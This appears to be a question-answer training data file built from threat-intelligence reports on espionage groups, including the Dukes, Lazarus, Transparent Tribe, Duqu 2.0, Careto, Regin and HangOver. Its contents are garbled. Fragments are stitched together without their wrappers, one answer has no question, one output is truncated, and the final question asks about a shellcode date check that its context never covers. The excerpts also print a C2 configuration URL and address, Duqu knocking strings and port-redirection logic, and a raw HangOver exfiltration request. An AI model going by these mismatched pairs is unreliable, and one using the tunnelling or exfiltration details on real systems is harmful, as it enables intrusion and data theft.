    "instruction": "Big Headline: EXECUTIVE SUMMARY\nThe Dukes are a well-resourced, highly dedicated and organized cyberespionage group that we believe has been working for the Russian Federation since at least 2008 to collect intelligence in support of foreign and security policy decision-making.\nThe Dukes primarily target Western governments and related organizations, such as government ministries and agencies, political think tanks, and governmental subcontractors. Their targets have also included the governments of members of the Commonwealth of Independent States; Asian, African, and Middle Eastern governments; organizations associated with Chechen extremism; and Russian speakers engaged in the illicit trade of controlled substances and drugs.\nThe Dukes are known to employ a vast arsenal of malware toolsets, which we identify as MiniDuke, CosmicDuke, OnionDuke, CozyDuke, CloudDuke, SeaDuke, HammerDuke, PinchDuke, and GeminiDuke. In recent years, the Dukes have engaged in apparently biannual large-scale spear-phishing campaigns against hundreds or even thousands of recipients associated with governmental institutions and affiliated organizations.\nThese campaigns utilize a smash-and-grab approach involving a fast but noisy break-in followed by the rapid collection and exfiltration of as much data as possible. If the compromised target is discovered to be of value, the Dukes will quickly switch the toolset used and move to using stealthier tactics focused on persistent compromise and long-term intelligence gathering.\n...the Dukes show unusual confidence in their ability to continue successfully compromising their targets  [...], as well as in their ability to operate with impunity.\nIn addition to these large-scale campaigns, the Dukes continuously and concurrently engage in smaller, much more targeted campaigns, utilizing different toolsets. These targeted campaigns have been going on for at least 7 years. The targets and timing of these campaigns appear to align with the known foreign and security policy interests of the Russian Federation at those times.\nThe Dukes rapidly react to research being published about their toolsets and operations. However, the group (or their sponsors) value their operations so highly that though they will attempt to modify their tools to evade detection and regain stealth, they will not cease operations to do so, but will instead incrementally modify their tools while continuing apparently as previously planned.\nIn some of the most extreme cases, the Dukes have been known to engage in campaigns with unaltered versions of tools that only days earlier have been brought to the public's attention by security companies and actively mentioned in the media. In doing so, the Dukes show unusual confidence in their ability to continue successfully compromising their targets even when their tools have been publicly exposed, as well as in their ability to operate with impunity.\n\nBased on the above text, answer a question. What is the significance of the Dukes' biannual large-scale spear-phishing campaigns, and how do they transition to more stealthy tactics if a target is deemed valuable?",
    "output": "The Dukes engage in biannual large-scale spear-phishing campaigns targeting hundreds or even thousands of recipients associated with governmental institutions and affiliated organizations. These campaigns use a 'smash-and-grab' approach, involving a fast but noisy break-in followed by the rapid collection and exfiltration of as much data as possible. If the compromised target is discovered to be of value, the Dukes quickly switch their toolset and move to using stealthier tactics focused on persistent compromise and long-term intelligence gathering. This strategy allows them to maximize their initial impact while maintaining the flexibility to establish long-term access to high-value targets.",

It receives connections from the backdoor, but only serves as a proxy to a \"second-stage\" server where the operators actually store orders.\nCustomer_Session.asp is a first-stage C2 script responsible for delivering commands from the next-stage C2 server and command execution results from the implant. In order to deliver proper commands to each victim, the bbs_code parameter from the implants is used as an identifier. The script uses this identifier to assign commands to the correct victims. Here is how the process of sending an order for a particular victim works:\n1. The malware operator sets the corresponding flag([id]_208) of a specific implant and saves the command to the variable([id]_210).\n2. The implant checks the corresponding flag([id]_208) and retrieves the command from the variable([id]_210) if it is set.\n3. After executing the command, the implant sends the result to the C2 server and sets the corresponding flag.\n4. The malware operator checks the flag and retrieves the result if the flag is set.\nBig Headline: Attribution\nWe assess with high confidence that the activity analyzed in this post is attributable to the Lazarus group. In our previous research, we already attributed the malware clusters used in both incidents described here to the Lazarus group. First of all, we observe that the wAgent malware used against the health ministry has the same infection scheme as the malware that the Lazarus group used previously in attacks on cryptocurrency businesses.\nBoth cases used a similar malware naming scheme, generating two characters randomly and appending \"svc\" to it to generate the path where the payload is dropped.\nBoth malicious programs use a Security Support Provider as a persistence mechanism.\nBoth malicious programs have almost identical debugging messages.\nHere is a side-by-side comparison of the malware used in the ministry of health incident, and the malware () used in the cryptocurrency business attack:\nRegarding the pharmaceutical company incident, we previously concluded that Bookcode is exclusively used by the Lazarus group. According to our Kaspersky Threat Attribution Engine (KTAE), one of the Bookcode malware samples (MD5 ) contains lots of code overlaps with old Manuscrypt variants.\nBig Headline: Kaspersky Threat Attribution Engine results for Bookcode\nMoreover, the same strategy was used in the post-exploitation phase, for example, the usage of ADFind in the attack against the health ministry to collect further information on the victim's environment. The same tool was deployed during the pharmaceutical company case in order to extract the list of employees and computers from the Active Directory. Although ADfind is a common tool for the post-exploitation process, it is an additional data point that indicates that the attackers use shared tools and methodologies.\nRead the text above and answer this question: What are the key indicators that led to the attribution of the recent attacks on a health ministry and a pharmaceutical company to the Lazarus group?

DNS resolution points to the same IP address: 89.45.67[.]160.\nUsing our Kaspersky Threat Intelligence Portal, we found the following related URL:\nMedium Headline: The code used to check if legitimate packages are installed\nThe first application on the list that is not installed on the system will be selected as the target application. The malware embeds multiple APK files, which are stored in a directory named \"assets\". The analyzed sample includes the following packages:\napk a20fc273a49c3b882845ac8d6cc5beac\napk 53cd72147b0ef6bf6e64d266bf3ccafe\napk bae69f2ce9f002a11238dcf29101c14f\napk b8006e986453a6f25fd94db6b7114ac2\napk 4556ccecbf24b2e3e07d3856f42c7072\napk 6c3308cd8a060327d841626a677a0549\nThe selected APK is copied to /.System/APK/. By default, the application tries to save the file to external storage, otherwise it saves it to the data directory.\nFinally, the application tries to install the copied APK. The final malware is a modified version of the AhMyth Android RAT, open-source malware downloadable from GitHub, which is built by binding the malicious payload inside other legitimate applications.\nThe original AhMyth RAT includes support for the following commands:\nBasically, it provides the following features:\ncamera manager (list devices and steal screenshots)\nfile manager (enumerate files and upload these to the C2)\nSMS manager (get a list of text messages or send a text)\nget the call log\nget the contact list\nmicrophone manager\nlocation manager (track the device location)\nThe RAT that we analyzed is slightly different from the original. It includes new features added by the attackers to improve data exfiltration, whereas some of the core features, such as the ability to steal pictures from the camera, are missing.\nThe operators added the following commands:\nx000upd \u2013 download a new APK from the URL specified in the \"path\" field.\nx000adm \u2013 autodownloader: not implemented in the version we analyzed, but available in other samples.\nMoreover, the creators of the RAT also improved its audio surveillance capabilities and included a command to delete text messages with specific contents.\nThe \"autodownloader\" is a method used for performing the following actions:\nupload a contact list\nupload a text message list\nupload files stored in the following directories:\n/.System/Records/\n/Download/\n/DCIM/Camera/\n/Documents/\n/WhatsApp/Media/WhatsApp Images/\n/WhatsApp/Media/WhatsApp Documents/\nThe attacker uses the method to collect contacts and text messages automatically. In addition, the method collects the following: audio files created with the \"x0000mc\" command and stored in /.System/Records/, downloaded files, photos, images and documents shared via WhatsApp and other documents stored on the device.\nAnother interesting difference between the original AhMyth and the one modified by Transparent Tribe is the technique used for getting the C2 address. The original version stores the C2 server as a string directly embedded in the code, whereas the modified version uses a different approach. It embeds another URL encoded with Base64 and used for getting a configuration file, which contains the real C2 address.\nIn our sample, the URL was as follows:\nhxxp://tryanotherhorse[.]com/config.txt\nIt provided the following content:\n212.8.240.221:5987\nhttp://www.tryanotherhorse.com\nThe first value is the real C2, which seems to be a server hosted in the Netherlands.\nThe modified version communicates via a different URL scheme, which includes more information:\nOriginal URL scheme: http://%server%:%port? model=%val%&manf=%val%&release=%val%&id=%val%\nModified URL scheme http://%server%:%port?\nmac=%val%&battery=%val%&model=%val%&manf=%val%&release=%val%&id=%val%\nBig Headline: Covid-19 tracking app\nWe found evidence of Transparent Tribe taking advantage of pandemic-tracking applications to distribute trojanized code. Specifically, we found an APK file imitating , a COVID-19 tracking mobile application developed by the National Informatics Centre under the Ministry of Electronics and Information Technology, Government of India. It allows users to connect to essential health services in India.\nThe discovered application tries to connect to the same malicious URL to get the C2 IP address: hxxp://tryanotherhorse[.]com/config.txt\nIt uses the same URL scheme described earlier and it embeds the following APK packages:\napk CF71BA878434605A3506203829C63B9D\napk 627AA2F8A8FC2787B783E64C8C57B0ED\napk 62FAD3AC69DB0E8E541EFA2F479618CE\napk A912E5967261656457FD076986BB327C\napk 3EB36A9853C9C68524DBE8C44734EC35\napk 931435CB8A5B2542F8E5F29FD369E010\nInterestingly enough, at the end of April, the Indian Army issued a warning to its personnel against Pakistani agencies' nefarious designs to hack the phones of Indian military personnel through a malicious application similar to Aarogya Setu.\nAccording to some Indian online , these applications were found to be sent by Pakistani Intelligence Operatives to WhatsApp groups of Indian Army personnel.

The malware selects the first application on a predefined list that is not installed on the target system and copies the corresponding APK to the device. The malware then attempts to install the copied APK. This technique allows the attackers to disguise their activities by making the installation appear legitimate. For example, the group has used this method to distribute a trojanized version of the Aarogya Setu COVID-19 tracking app, which is a legitimate application developed by the Indian government.

    "instruction": "Big Headline: PERSISTENCE MECHANISM\nThe Duqu 2.0 malware platform was designed in a way that survives almost exclusively in memory of the infected systems, without need for persistence. To achieve this, the attackers infect servers with high uptime and then re-infect any machines in the domain that get disinfected by reboots. Surviving exclusively in memory while running kernel level code through exploits is a testimony to the technical prowess of the group. In essence, the attackers were confident enough they can survive within an entire network of compromised computers without relying on any persistence mechanism at all.\nThe reason why there is no persistence with Duqu 2.0 is probably because the attackers wanted to stay under the radar as much as possible. Most modern anti-APT technologies can pinpoint anomalies on the disk, such as rare drivers, unsigned programs or maliciously-acting programs. Additionally, a system where the malware survives reboot can be imaged and then analyzed thoroughly at a later time. With Duqu 2.0, forensic analysis of infected systems is extremely difficult \u2013 one needs to grab memory snapshots of infected machines and then identify the infection in memory.\nHowever, this mechanism has one weakness; in case of a massive power failure, all computers will reboot and the malware will be eradicated. To get around this problem, the attackers have another solution \u2013 they deploy drivers to a small number of computers, with direct Internet connectivity. These drivers can tunnel traffic from the outside into the network, allowing the attackers to access remote desktop sessions or to connect to servers inside the domain by using previously acquired credentials. Using these credentials, they can re-deploy the entire platform following a massive power loss.\nBig Headline: COMMAND AND CONTROL MECHANISMS\nDuqu 2.0 uses a sophisticated and highly flexible command-and-control mechanism that builds on top of the 2011 variant, with new features that appear to have been inspired by other top class malware such as Regin. This includes the usage of network pipes and mailslots, raw filtering of network traffic and masking C&C traffic inside image files.\nInside a Windows LAN, newly infected clients may not have a C&C hardcoded in their installation MSI packages. Without a C&C, they are in \"dormant\" state and can be activated by the attackers over SMB network pipes with a special TCP/IP packet that contains the magic string \"tttttttttttttttt\". If a C&C is included in the configuration part of the MSI file, this can be either a local IP address, which serves as a bouncing point or an external IP address. As a general strategy for infection, the attackers identify servers with high uptime and set them as intermediary C&C points. Hence, an infected machine can jump between several internal servers in the LAN before reaching out to the Internet.\nTo connect the the C&C servers, both 2011 and 2014/2015 versions of Duqu can hide the traffic as encrypted data appended to a harmless image file. The 2011 version used a JPEG file for this; the new version can use either a GIF file or a JPEG file. Here's how these image files look like:\nAnother modification to the 2014/2015 variants is the addition of multiple user agent strings for the HTTP communication. The 2011 used the following user agent string:\n\u2022 Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 (.NET CLR 3.5.30729)\nThe new variants will randomly select an user agent string from a table of 53 different possible ones.\nAnother unusual C&C mechanism relies on driver files that are used to tunnel the C&C communications and attacker's RDP/SMB activity into the network. The attackers deploy such translation drivers on servers with direct Internet connectivity. Through a knocking mechanism, the attackers can activate the translation mechanism for their IPs and tunnel their traffic directly into the LAN. Outside the LAN, the traffic can be masked over port 443; inside the LAN, it can be either direct SMB/RDP or it can be further translated over fake TCP/IP packets to IP 8.8.8.8.\nDuring our investigation, we observed several such drivers. A description can be found below.\nMedium Headline: The \"portserv.sys\" driver analysis\nMD5: 2751e4b50a08eb11a84d03f8eb580a4e\nSize: 14336\nCompiled: Sat Feb 11 21:55:30 2006 (fake timestamp)\nInternal name: termport.sys\nType: Win32 device driver (a 64 bit version is known as well)\nThis is a malicious NDIS filter driver designed to perform manipulation of TCP/IP packets to allow the attacker to access internal servers in the victim's infrastructure.\nUpon startup, the filter driver hooks into the NDIS stack and starts processing TCP/IP packets.\nTo leverage the driver, the attacker first sends a special TCP/IP packet with the string \"romanian.antihacker\" to any of the hardcoded IPs belonging to infected server. In general, such servers are computers with direct Internet connectivity, such as a webserver or a proxy. The driver sees the packet, recognizes the magic string \"romanian. antihacker\" and saves the attacker's IP for later use.\nMagic string used for knocking inside the driver.\nWhen a packet comes from the attacker's IP (saved before), the following logic applies:\n\u2022 Packet to server 1's IP on port 443, is redirected on port 445 (Samba/Windows file system)\n\u2022 Packet from server 1's IP from port 445, is redirected to attacker's IP port 443\n\u2022 Packet to server 2's IP on port 443 is redirected on port 3389 (Remote Desktop)\n\u2022 Packet from server 2's IP from port 3389 is redirected to attacker's IP port 443\nThis effectively allows the attackers to tunnel SMB (remote file system access) and Remote Desktop into these two servers while making it look like SSL traffic (port 443).\nThese drivers allow the Duqu attackers to easily access servers inside the LAN from remote, including tunneling RDP sessions over Port 443 (normally SSL). It also gives them a persistence mechanism that allows them to return even if all the infected machines with the malware in memory are rebooted. The attackers can simply use existing credentials to log back into any of the servers that the driver is serving and can reinitialize the backdoors from there.\n\nHow does the command and control (C&C) mechanism of Duqu 2.0 differ from its 2011 variant, and what new features were inspired by other top-class malware like Regin?",
    "output": "The C&C mechanism of Duqu 2.0 builds on the 2011 variant with new features inspired by other top-class malware like Regin.

Those data are then used to create a behavorial \u00abtemplate\u00bb of the OT network which is then used as a white list to detect anomalies. ICS CyberVision use IA algorithms to caracterise and prioritize those anomalies in order to eliminate false positive and facilitate the remediation process.  In addition scripts from Sentryo Security Labs are provided to ICS CyberVision users. These scripts use the CyberVision Center API to mine their CyberVision installations to check for some Indicators of Compromise (IOC).\nIn the case of organization is in the energy sector and may have been targeted by this new Black Energy campaign or the latest Grizzly Steppe (see the DHS report), we strongly encourage them to run these scripts and check their ICS.\nMoreover, if ICS CyberVision had been deployed inside the process and control networks of an Energy corporation, it would have detected several weak signals enabling the local team to stop the attacks early:\nRegarding Black Energy, ICS CyberVision would have detected unknown connections to a remote Internet website (the C&C channels). These connections would have been seen as a change compared to the baseline (a set of given network behaviors) defined by plant operators.\nRegarding Industroyer/CrashOverride, ICS CyberVision would have detected any new connections to a remote Internet website (the C&C channels), and also new and strange behaviours on the OT networks like multiple OT network scans and critical OT communications like orders.\nRegarding the Disakil \"wiper\", ICS CyberVision would have detected the disappearance of TCP connections between the SCADA stations and the PLCs / RTUs. The defined baseline includes these connections and the fact that they stopped being active would have automatically been detected as a change by the difference engine.\nRegarding the breaker manipulation, ICS CyberVision would have analysed IEC 101 (serial over ethernet) flows and detected the order to open up the breaker and to switch off power. CyberVision would help to trace down the hackers to particular infected machines.\nRegarding the Siemens safety equipment DoS vulnerability used by Industroyer (CVE-2015-5374), it will be detected by ICS Cybervision thanks to its Knowledge Database. Back in 2015, Siemens provided a firmware update fixing this issue. It is even more important today to patch these equipments. Our solution can help by clearly identifying the potentially affected devices in the network.\nThe only vector which would have remained undetected by ICS CyberVision is the \"dropper\" i.e. an Excel spreadsheet or Word document in later case. It is the responsibility of an email gateway or an endpoint protection software to detect such attack vectors. The malware could also have been inserted via a malicious USB drive and only endpoint protection software can prevent these attacks.\nSince Stuxnet, the malware Industroyer / CrashOverride is the first advanced and targeted industrial malware we have seen with this level of maturity. From a defense point of view, this malware also shows the need for an ICS network security monitoring capability to be able to detect these advanced attacks early in the kill chain.\nLet's have look at the kill chain and the malware impact. This is important because investigations are still ongoing and some information may have not been communicated. Because of this, Phase 1 and part of the Phase 2 are pure assumptions using our experience and external claims:\nPHASE 1\nMedium Headline: BY VYTAUTAS BUTRIMAS -SUBJECT MAT TER EXPERT, RESEARCH AND LESSONS LEARNED DIVISION, NATO ENERGY SECURITY CENTER OF EXCELLENCE2\nToday's cyber attacker is several steps ahead of the defender. This is especially so in the case of a single operator trying to defend against a state resourced APT attacker. This is an unfair match, similar to a high-school soccer team's chances of defeating a FIFA World Cup contender. It is no contest unless the school team's capabilities are significantly enhanced. It is important to realize that the operator-defender has a complex task of managing and protecting increasingly interconnected and sophisticated systems enabled with the latest advances in information and communications technologies (ITC).\nTechnologies that in addition to providing new features and possibilities for remote management and control also introduce vulnerabilities for an adversary to exploit. The operator now faces a difficult challenge in managing systems that are vulnerable to not only intentional but also unintentional cyber incidents. Incidents that result from errors in managing interconnected and complex systems. The attacker needs only to find a single weakness in the design or exposed vulnerability in order to defeat all the wide-ranging efforts of the defender.\nIn order for the operator of critical infrastructure to avoid becoming an isolated target for an adversary that often is several steps ahead of the defender he must improve his relationship among operators of critical infrastructure, manufacturers, academia and Government institutions responsible for cybersecurity. The aim should be in setting up a mechanism that will facilitate the timely sharing of information on cyber threats, coordinating a response to an incident and sharing lessons learned. At the local level, National cybersecurity councils that represent the communities of interest (CoI) should be created as a first step in setting up a national cybersecurity capacity for protecting critical infrastructure from these advanced and persistent threats from cyberspace.\nThis is not an easy task since fear of lawsuits, embarrassment and concerns for confidentiality often make operators as well as manufacturers of control equipment reluctant to share the information needed to enhance resilience and enhance recovery capabilities. This lack of sharing can only contribute to making defenders more isolated and less aware of the significance\nof the problem. In addition to the high level National council a working level network for timely sharing of threat information and lessons learned should be created for dealing with immediate issues and facilitating coordinated effective response in times of emergency. In summary it is only through cooperation and sharing of information among a community of interest that an operator-defender can hope to deal with today's advanced and persistent threats emanating from cyberspace.\n14\n2.

As soon as we find new vulnerabilities we immediately inform the vendor in a responsible manner and provide all the details required for a fix.\nOn October 10, 2017, Kaspersky Lab's advanced exploit prevention systems identified a new Adobe Flash zero day exploit used in the wild against our customers. The exploit was delivered through a Microsoft Office document and the final payload was the latest version of FinSpy malware. We have reported the bug to Adobe who assigned it (<https://helpx.adobe.com/security/products/flash-player/apsb17-32.html>)CVE-2017-11292 and released a patch earlier today:\nSo far only one attack has been observed in our customer base, leading us to believe the number of attacks are minimal and highly targeted.\nAnalysis of the payload allowed us to confidently link this attack to an actor we track as \"BlackOasis\". We are also highly confident that BlackOasis was also responsible for another zero day exploit (CVE-2017-8759) discovered by (<https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html>)FireEye in September 2017.

    "instruction": "Context: Medium Headline: 2.2 Field Investigation\nOur objective is to ultimately understand the capabilities and motivations of those engaged in targeted malware attacks. Field research provides critical insight into the methods and operations of the attackers. By analyzing computers at locations that are routinely targeted by (similar) attackers, we aim to identify portions of command and control infrastructure that the attackers use for particular targets as well as document the type of data that the attackers exfiltrate from the targets. However, our research aims to be more than just extracting information from those who have been compromised.\nThe Tracking GhostNet investigation revealed significant compromises at Tibetan-exile and Indian targets. It was also found that Indian government related entities, both in India proper and throughout the world, had been thoroughly compromised. These included computers at Indian embassies in Belgium, Serbia, Germany, Italy, Kuwait, the United States, Zimbabwe, and the High Commissions of India in Cyprus and the United Kingdom. During the GhostNet investigation we had discovered evidence of multiple infections for which the information available was incomplete, and to which we wanted to return for follow up. In particular, we found one piece of malware uploading sensitive documents. Another report published soon after Tracking GhostNet, entitled \"The Gh0st in the Shell: Network Security in the Himalayas,\" analysed the network traffic of Air Jaldi, a community WiFi network in Dharamsala, India. It found that computers in Dharamsala were connecting with two of the control servers documented in our report (Vallentin et al. 2009).\nWith the aim of focusing on both these wider pattern of compromises, and the hanging threads from the previous investigation, we worked with our existing approach, informed by the view that collecting data as close to the intended target as possible was likely to yield actionable evidence of breaches that could be followed through to their source, lead to wider pools of target sets, and yield information on the attackers.\nIn conducting the field research we were influenced by the Action Research (AR) literature (Lewin 1946; Curle 1947) that has evolved since the 1940s, as well as other field-based investigation and research techniques. The AR field-based approach feeds into the fusion methodology that guides our overall investigatory process. It employs ethical and participatory observations and structured focused interviews. We combined this grounded research with technical interrogation, including network monitoring activities. As with GhostNet, we were fortunate to have the cooperation of Tibetan organizations, and benefited tremendously from the willingness of His Holiness the Dalai Lama and other Tibetans to share information with our investigators. As a result, for the Shadow investigation we conducted primary field research in Dharamsala, India from August until December 2009. (Dharamsala is the location of the OHHDL as well as the TGIE).\nThe primary objectives of the field investigations were to research the wider patterns of compromised Indian and Tibetan related targets, investigate the reports of targeted malware attacks that have emerged from the Tibetan community, and raise information and computer security awareness within the Tibetan community and assist in their security planning and implementation. Throughout the field investigation process, we also investigated the broader social, political, military, and intelligence context. We conducted extensive on-site interviews with officials in the Tibetan Government-in-Exile, the Office of the Dalai Lama and Tibetan NGOs. These interviews allowed us to gain an understanding of the security practices and network infrastructure of compromised locations. We also used network monitoring software during field investigations in order to collect technical data from compromised computer systems and perform an initial analysis to confirm the existence of malware and the transfer of information between compromised computers and command and control servers. The network monitoring tools allowed us to collect samples from compromised computers and identify command and control servers used by the attackers. The network monitoring was undertaken with the explicit consent of the Tibetan organizations.\nWhile monitoring the network traffic of a local NGO, Common Ground, as part of an Internet security audit, traffic from a local WiFi mesh network, TennorNet was also captured, revealing malicious activity. An anomaly was detected when analyzing this traffic: computers in Dharamsala were beaconing or checking in with a command and control server (jdusnemsaz.com/119.84.4.43) located in Chongqing, PRC. The location of Chongqing is contextually interesting as it has a high concentration of Triads \u2014 well known Asian-based organized criminal networks \u2014 who have significant connections to the Chinese government and the Chinese Communist Party (Lam 2009). The Triads have extended their traditional criminal activities to include technology-enabled crime\nsuch as \"computer software piracy and credit card forgery and fraud\" (Choo 2008).\nAn investigation revealed that the computer on TennorNet generating the malicious traffic belonged to Mr. Serta Tsultrim, a Tibetan Member of Parliament, editor of of the weekly Tibetan language newspaper Tibet Express and the director of the Khawa Karpo Tibet Culture Centre. Tsultrim is also the coordinator of the Association of Tibetan Journalists (ATJ). We probed for his threat perception, and who he felt might be targeting him and why. We sought to establish his perception of what documents and correspondence might be particularly sensitive. Tsultrim was particularly concerned about this network being compromised.\nFollowing the discovery of this compromise, we approached the OHHDL and formally requested permission to audit network traffic to determine whether we could identify similar beacon packets associated with the command and control server (jdusnemsaz.com/119.84.4.43). A representative of OHHDL agreed that we could access the office network under an agreement similar to the initial GhostNet investigation. In consultation with OHHDL staff, we focused our attention on the desktop machines that were most likely to be compromised, and commenced a network tap of a number of workstations. Interestingly, it was one of these workstations that was the origin of the GhostNet investigation, where we had observed sensitive documents being exfiltrated in September 2008. Almost immediately we identified malicious traffic connecting with the command and control server (jdusnemsaz.com/119.84.4.43).\nOur next step was to refer to the management interface in the ICSA-certified Cyberoam firewall that the OHHDL had installed in their network as part of their extensive upgrading of security procedures in the wake of the GhostNet breach. We isolated all outbound traffic to the command and control server and identified any other machines on the office Local Area Network that were currently, or had recently, been communicating with the command and control server. From the Cyberoam interface we were able to identify one other machine that was compromised. We proceeded to tap the traffic from this machine and began to see domain names associated with the distributed social media command and control channels that we would later identify in the lab as part of the command and control infrastructure. Similarly, the lab investigation was able to reconstruct the documents that were exfiltrated from OHHDL machines and we were able to brief OHHDL on the extent of the breach.\nAnswer this question: How did the field investigation in the 'Shadowserver_shadows-in-the-cloud' report contribute to understanding the broader patterns of compromised Indian and Tibetan related targets?",

All sinkholed domains have been redirected to the Kaspersky Sinkhole server. This provided detailed information regarding the location of the victims.\nAdditionally, some of the Command and control servers maintain a debug log which includes information about the victims such as IPs and timestamps. This debug log file is stored in a folder named \"ClientsDirectory\" and is named \"log.txt\". By collecting \"log.txt\" files from various Careto C&C servers, it was possible to make a more detailed map of the IPs for victims of these attacks.\nIn total, we observed over 1,000 victims' IPs in 31 countries. We have also found traces of at least 380 different victim\u00b4s IDs according to attackers\u00b4 naming schema both in logs and sinkholed requests.\nThe following charts correspond only to sinkholed data and ignores the historical one retrieved in log files. This data is fresher, showing the current interest of the attackers.\nThe first chart shows the geographical distribution of the victim\u00b4s IDs:\nIn this case there is a clear outlier. The reason is that there is a big cluster of victims in Cuba corresponding to very few IP addresses, all belonging to the same institution.\nThe followin chart provides the geographical location of victim\u00b4s IPs instead of Ids using only sinkholed data:\nIn this chart we see the opposite effect than in the previous one, in this case with Venezuela, where few victims use multiple IPs.\nSpain, France and Morocco are the only countries appearing in the top 5 in all cases.\nThe main targets of Careto fall into the following categories:\n\u25cf Government institutions\n\u25cf Diplomatic / embassies\n\u25cf Energy, oil and gas companies\n\u25cf Research\n\u25cf Private equity firma\n\u25cf Activists\nBig Headline: 3.

Used for all communications with the command and control servers.\nThis would be the contraction of \"Me cago en la mar\", a Spanish expression meaning \"fuck\".\n\uf0b7 \"Accept-Language: es Accept-Encoding: gzip\" - in the configuration data\nThe authors did a number of mistakes as well. For instance, they forgot debug information in a SGHTesterCmd module which contains a path on the developer's machine:\n\uf0b7 c:\\Dev\\CaretoPruebas3.0\\release32\\CDllUninstall32.pdb\n\"Pruebas\" means \"tests\" in Spanish.\nAlso there are some small mistakes in some English comments:\n//Attempt to move the uploaded file to it's new place\nUnistalling Careto\nUinstalling SGH\nIn the exploiting server we have found most of the subdomains simulating newspapers from Spain.\nIt should be noted that Spanish is spoken in 21 countries, where it is either a national language or de facto official language.

    "instruction": "Medium Headline: 4.5 Cleanup\nAfter the invocation of the payload's export number 1, Regin's 64-bit stage #1 component will proceed to unload the payload and terminate operations. The malware will first invoke the payload's entry point passing the DLL_PROCESS_ DETACH parameter, to notify the payload of the impending unload. After this, stage #1 will start removing the artifacts\nthat were associated to the execution. Each item that was associated with the payload and its interactions with stage #1 is carefully first overwritten then, where applicable, deallocated.\nIn this final part of the execution, we also find references to the a value of 0xFEDCBAFF; such value is just one off from the value of 0xFEDCBAFE, which was observed in samples of Regin's 32-bit stage #1 component.\nBig Headline: 5. ConClusions\nOur analysis of the Regin's 64-bit stage #1 component, as detailed in this document, shows that the malware is designed to retrieve a payload from an already infected system, map it into memory and transfer control to it. The utilitarian nature of the rootkit makes it obvious that this a support module, designed to enable the presence of something surely more meaningful. Most of the malware's code is fairly generic, therefore allowing it to load any kind of payload as long as it satisfies a minimum number of constraints mostly related to how it is stored on the disk. This is a sign that Regin is designed as a platform rather than an individual entity.\nGiven the support nature of Regin's 64-bit stage #1 component, precise attribution is fairly challenging. The similarities with the 32-bit version of Regin's stage #1 are very strong, starting from the fact the two different versions of the malware have the same high level purpose, to the fact that they share code like the QuickPeParse subroutine and the string expansion functionalities. We are quite confident in claiming that this 64-bit version of Regin's stage #1 component is an evolution of the 32-bit version, designed to work on more modern versions of the Windows operating system.\nLike with the 32-bit version, we have observed a great care put into this malware by its authors. The code of the malware is tidy and safe, making it less likely to malfunction or crash during operations. Its camouflage is similarly done with a great attention to details, effectively making the malware blend seamlessly with the rest of Windows' standard system files. All of this supports us in confirming our suspicion that the authors of Regin are skilled developers, experienced in the ways of software design and implementation.\n\nQ: What design aspects of Regin's 64-bit stage #1 component indicate that it is part of a larger malware platform rather than an individual entity? How does this design philosophy impact the attribution and analysis of the malware?",
    "output": "A: The design aspects indicating that Regin's 64-bit stage #1 component is part of a larger platform include its utilitarian nature, which allows it to load various payloads as long as they meet certain constraints. This modularity suggests that Regin is designed to support multiple functionalities and stages of an attack. The similarities with the 32-bit version, including shared code like the QuickPeParse subroutine and string expansion functionalities, further reinforce this idea. The careful and tidy code, along with effective camouflage, indicates that the authors are skilled developers. This design philosophy impacts attribution by making it challenging due to the generic nature of much of the code, while also highlighting the sophistication and experience of the malware's creators.",

When it triggers it downloads and runs a malicious executable from the domain softmini.net; also the domain used by two of the three documents mentioned above.\nSoftmini.net seems to be a hub for exploitcode; its subdomain get.adobe.flash.softmini.net contains an active Java exploit (CVE-2012-0422) which attempts to install the same trojan as the IE exploit above.\nBig Headline: The Smackdown downloaders\nMost of the first stage malware we've seen used in attacks are variants of Smackdown, a large family of Visual Basic downloaders which for the most part seem to be written by a person calling himself \"Yash\" or \"Yashu\". These have evolved over time and are using different levels of obfuscation on text strings. Typically the trojan begins by uploading system information to a PHP script on the C&C server. The attacker can decide separately which infected machine should receive additional malware. The second stage malware is usually Hanove but other malware families are also used.\nDifferent text obfuscations in a Smackdown \"miNaPro\" downloader. Reversed strings, character code encoding and inserting garbage '%' characters.\nBig Headline: The HangOver malware, aka Hanove\nThe second stage malware are often variants of HangOver, information stealers written in C++. They appear to be written over a common framework as many internal functions are identical, but overall functionality can vary quite a bit from one subtype to another. The first versions of these may have been based on code from an innocent backup utility as the word \"backup\" is often present.\nHanove Uploaders recursively scan folders looking for files to upload. What kind of files they look for are usually defined in resources as an extension list, and these lists vary. Here are a few examples:\nHanove keyloggers set up keyboard hooks or polls to capture keypresses and log these to a text file. Some variants capture other data as well, such as clipboard content, screenshots, titles of open windows and content of browser edit fields. Timed events are set up to upload the data to the remote server.\nThe stolen data are uploaded to remote servers by FTP or HTTP.\nA typical HTTP request looks like this:\nPOST /up.php HTTP/1.1\nContent-Type: multipart/form-data; boundary=F39D45E70395ABFB8D8D2BFFC8BBD152\nUser-Agent: EMSFRTCBVD\nHost: remotedomain.com\nContent-Length: 5050\nCache-Control: no-cache\n--F39D45E70395ABFB8D8D2BFFC8BBD152\nContent-Disposition: form-data; name=\"uploaddir\" subfolder/%username-machinename%/C/\n- -F39D45E70395ABFB8D8D2BFFC8BBD152\nUserAgent strings vary between versions. The following have been seen in connection with this family:\nEMSCBVDFRT, EMSFRTCBVD, FMBVDFRESCT, DSMBVCTFRE, MBESCVDFRT, MBVDFRESCT TCBFRVDEMS, DEMOMAKE, DEMO, UPHTTP, sendFile\nBoundary parameters vary between versions. The following have been seen in connection with this family:\nString content consists of some strings largely static between variants, and some that vary. Non-static strings are browser UserAgent strings, MIME boundary tags, mutexes, domain names, paths, and registry keys, which also may be obfuscated by being fragmented. Many Hanove variants use a simple rotating encoding scheme to hide the interesting strings. For example, the domain \"wearwellgarments.eu\" is hidden as \"xfbsxfmmhbsnfout/fv\" and the word \"php\" becomes \"qiq\".\nDifferent variants are frequently given internal names, visible through debug paths included in the binary. Such internal names used include \"HangOver\", \"Ron\", \"Dragonball\", \"Tourist\", \"Klogger\", \"FirstBlood\" and \"Babylon\".\nThere are several other malwares and tools in use. See appendix C for more indicators.\n\nAnswer this question based on the above context: Why did the shellcode in the Telenor attack contain a date check, and how did it affect the behavior of the exploit?",
